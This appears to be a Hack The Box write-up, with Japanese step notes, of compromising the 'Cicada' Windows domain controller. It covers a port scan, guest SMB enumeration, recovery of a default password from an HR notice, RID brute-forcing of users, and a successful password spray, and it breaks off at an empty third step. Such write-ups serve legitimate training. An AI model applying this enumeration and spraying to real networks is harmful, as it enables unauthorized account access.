https://app.hackthebox.com/machines/627

## STEP 1
```sh
└─$ rustscan -a 10.129.231.149 --no-banner --scripts none                
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.231.149:53
Open 10.129.231.149:88
Open 10.129.231.149:135
Open 10.129.231.149:139
Open 10.129.231.149:389
Open 10.129.231.149:445
Open 10.129.231.149:464
Open 10.129.231.149:593
Open 10.129.231.149:636
Open 10.129.231.149:3268
Open 10.129.231.149:3269
Open 10.129.231.149:5985
Open 10.129.231.149:53443
10.129.231.149 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,53443]
```


## STEP 2
guestでsmb列挙  
テキストファイルを発見
```sh
└─$ netexec smb 10.129.231.149 -u ' ' -p '' -M spider_plus                        
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\ : (Guest)
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV                             
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.231.149.json".
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] SMB Shares:           7 (ADMIN$, C$, DEV, HR, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] SMB Readable Shares:  2 (HR, IPC$)
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] Total folders found:  0
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] Total files found:    1
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] File size average:    1.24 KB
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] File size min:        1.24 KB
SPIDER_PLUS 10.129.231.149  445    CICADA-DC        [*] File size max:        1.24 KB
                                
└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.231.149.json 
{
    "HR": {
        "Notice from HR.txt": {
            "atime_epoch": "2024-08-28 17:31:48",
            "ctime_epoch": "2024-03-14 12:29:03",
            "mtime_epoch": "2024-08-28 17:31:48",
            "size": "1.24 KB"
        }
    }
}  
```
テキストファイル内にデフォルトパスワードを発見
```sh
└─$ netexec smb 10.129.231.149 -u ' ' -p '' --share HR --get-file 'Notice from HR.txt' '/home/kali/Notice_from_HR.txt'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\ : (Guest)
SMB         10.129.231.149  445    CICADA-DC        [*] Copying "Notice from HR.txt" to "/home/kali/Notice_from_HR.txt"
SMB         10.129.231.149  445    CICADA-DC        [+] File "Notice from HR.txt" was downloaded to "/home/kali/Notice_from_HR.txt"
                                                                                                                                                                       
└─$ cat Notice_from_HR.txt                              

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
ユーザを列挙するために、ridブルート実施
```sh
└─$ netexec smb 10.129.231.149 -u ' ' -p '' --rid-brute --log temp.txt
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [-] Error checking if user is admin on 10.129.231.149: The NETBIOS connection with the remote host timed out.
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\ : (Guest)
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```
パスワードスプレー実施、michael.wrightsonでログイン成功を確認
```sh
└─$ grep 'SidTypeUser' temp.txt | awk '{print $13}' | sed 's/CICADA\\//' > users.txt

└─$ netexec smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```
しかしmichael.wrightsonでは、winrmログインできないもよう
```sh
└─$ netexec ldap 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --groups 'Remote Management Users'
LDAP        10.129.231.149  389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
LDAP        10.129.231.149  389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.129.231.149  389    CICADA-DC        Emily Oscars
```


## STEP 3
